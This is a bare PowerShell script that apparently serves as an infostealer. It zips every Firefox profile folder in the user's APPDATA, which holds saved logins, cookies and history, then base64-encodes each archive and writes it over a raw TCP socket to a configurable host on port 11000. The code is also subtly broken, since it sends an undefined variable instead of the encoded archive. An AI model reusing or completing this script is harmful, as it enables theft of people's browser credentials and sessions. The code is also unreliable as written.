$host = "127.0.0.1"
$profilespath=$env:APPDATA+"\Mozilla\Firefox\Profiles"
$rnd = Get-Random
$zipDest = $env:TMP+"\"+$rnd+".zip"
$socket = New-Object net.sockets.tcpclient($host,11000);
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
Get-ChildItem $profilespath | % {
	Write-Host $_.FullName
	Compress-Archive -Path $_.FullName -CompressionLevel Fastest -DestinationPath $zipDest
    $ZipFileLocation =[System.Convert]::ToBase64String([io.file]::ReadAllBytes($zipDest));
    $writer.WriteLine($test);
}
$socket.close()
